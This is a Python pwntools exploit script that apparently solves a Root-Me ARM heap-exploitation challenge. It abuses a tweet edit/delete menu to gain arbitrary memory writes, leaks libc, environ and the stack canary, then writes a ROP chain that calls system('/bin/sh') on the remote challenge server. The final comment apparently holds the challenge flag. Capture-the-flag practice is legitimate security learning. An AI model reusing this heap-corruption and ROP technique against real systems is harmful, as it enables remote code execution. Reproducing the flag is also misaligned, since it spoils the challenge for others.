#!/usr/bin/python


# file ch55
# set architecture arm
# target remote 127.0.0.1:1234

# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./ch55


from pwn import *
import binascii
import sys


initialized = False


if len(sys.argv) > 1:
    debug = True
else:
    debug = False


if debug:
    r = process(['qemu-arm',  '-L', '/usr/arm-linux-gnueabi/', '-g', '1234', 'ch55'])
else:
    r = remote('challenge04.root-me.org', 61055)


def add_twit(size, tweet, r):
    print(r.recvuntil('>'))
    r.sendline("1")
    print(r.recvuntil('size:'))
    r.sendline(str(size))
    print(r.recvuntil('twit:'))
    r.sendline(tweet)
    print(r.recvuntil(':'))
    print("Twit added")

def edit_twit(index, to_change, r, wait_end = True):
    print(r.recvuntil('>'))
    r.sendline("2")
    print(r.recvuntil('ndex:'))
    r.sendline(str(index))
    print(r.recvuntil('twit:'))
    r.sendline(to_change)
    if wait_end:
        print(r.recvuntil(':'))
    print("Twit edited")

def del_twit(index, r, wait_end = True):
    print(r.recvuntil('>'))
    r.sendline("3")
    print(r.recvuntil('ndex:'))
    r.sendline(str(index))
    if wait_end:
        print(r.recvuntil(':'))
    print("Twit deleted")

def initialize(r):
    first_tweet = "\x00"*4+p32(0x81)+p32(0x23020)+p32(0x23024)+"\x00"*(0x80-0x10)+p32(0x80)+p32(0x88)
    add_twit(0x80, "fin", r)
    add_twit(0x80, "mdr", r)
    add_twit(0x80, "lol", r)
    edit_twit(2, first_tweet, r)
    del_twit(3, r)

def write_anything_anywhere(what_to_write, where_to_write, r, target_rewrite = 0x23020):
    global initialized
    if not initialized:
        initialize(r)
        initialized = True
    edit_twit(2, "a"*8+p32(where_to_write)+p32(target_rewrite), r, False)
    edit_twit(1, what_to_write, r, False)

write_anything_anywhere(p32(0x00022fb0)+p32(0x22fb4), 0x23008, r)


tmp = r.recvuntil('>')
leaked_libc = u32(tmp[1:5])

print("Leaked libc !")
print(hex(leaked_libc))


offset_environ = 0xa4adb
offset_system = -0x188f5
offset_bin_sh = 0x851cb
offset_pop_r0_r4_ret = 0x119c7
environ = leaked_libc+offset_environ
system = leaked_libc+offset_system
bin_sh = leaked_libc+offset_bin_sh
pop_r0_r4_ret = leaked_libc+offset_pop_r0_r4_ret
write_anything_anywhere(p32(environ)*2, 0x23008, r)

tmp = r.recvuntil('>')
leaked_environ = u32(tmp[1:5])

print("Leaked environ !")
print(hex(leaked_environ))


# offset = 90*4
# s = ''
# while True:
#     write_anything_anywhere(p32(leaked_environ-offset)*2, 0x23008, r)
#     offset += 1
#
#     tmp = r.recvuntil('>')
#     s = tmp[1]+s
#     print(offset)
#     print(s)
#     print(binascii.hexlify(s))


cookie = leaked_environ-101*4+1
return_addr = leaked_environ-96*4#-32

write_anything_anywhere(p32(cookie)*2, 0x23008, r)

tmp = r.recvuntil('>')
leaked_cookie = u32('\x00'+tmp[1:4])
print(binascii.hexlify(tmp))
print("Leaked cookie !")
print(hex(leaked_cookie))


# write_anything_anywhere(p32(return_addr+1)*2, 0x23008, r)
#
# tmp = r.recvuntil('>')
# print(tmp)
# print(binascii.hexlify(tmp))
# exit()


write_anything_anywhere(p32(pop_r0_r4_ret)+p32(bin_sh)+p32(cookie)+p32(system+1), return_addr, r)

r.interactive()


#0mG_wTf_I_d0Nt_3vEn
